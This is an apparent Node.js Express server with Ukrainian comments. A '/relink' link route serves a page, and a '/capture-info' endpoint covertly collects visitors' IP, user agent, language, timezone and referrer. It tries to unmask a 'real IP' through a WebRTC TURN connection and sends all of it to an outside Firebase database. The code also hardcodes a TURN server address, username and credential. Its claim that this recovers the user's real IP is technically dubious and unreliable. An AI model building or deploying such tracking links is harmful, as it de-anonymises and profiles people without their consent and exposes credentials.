const express = require('express');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');
const wrtc = require('wrtc');

const app = express();
app.use(bodyParser.json());
app.use(express.static('public'));

const iceConfiguration = {
    iceServers: [
        {
            urls: ["turn:18.216.50.200:3478"], // явно вказуємо порт
            username: "Anton",
            credential: "ade37e9f18e7c174dd248cd132cbca8db75d84b3bfb858653b8536c30b3fd015"
        }
    ]
};

app.post('/capture-info', async (req, res) => {
    const { timeZone, referrer } = req.body;
    const ipFromHeaders = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const language = req.headers['accept-language'];
    let dateTime = new Date().toISOString().replace(/[^0-9]/g, "").slice(2,12);

    // Створення WebRTC з'єднання
    const pc = new wrtc.RTCPeerConnection(iceConfiguration);

    pc.onicecandidate = async (event) => {
        if (event.candidate) {
            // Якщо це ваш TURN сервер, то отримана IP адреса є реальним IP користувача
            let match = /relay\sip\s([0-9.]+)/.exec(event.candidate.candidate);
            if (match) {
                let realIP = match[1];
                pc.close(); // Розриваємо з'єднання

                // Зберігаємо дані в Firebase
                await fetch('https://storagefortrash-default-rtdb.europe-west1.firebasedatabase.app/relink/' + dateTime + '.json', {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ip: ipFromHeaders,
						realip: realIP,
                        userAgent: userAgent,
                        language: language,
                        timeZone: timeZone,
                        referrer: referrer
                    }),
                });
                
                res.status(200).send('Info captured');
            }
        }
    };

    pc.createDataChannel(''); 
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
});

app.get('/relink', (req, res) => {
    if (req.query.url) {
        res.sendFile(__dirname + '/public/index.html');
    } else {
        res.send('URL parameter is missing.');
    }
});

app.listen(3000, () => console.log('Server is running on port 3000'));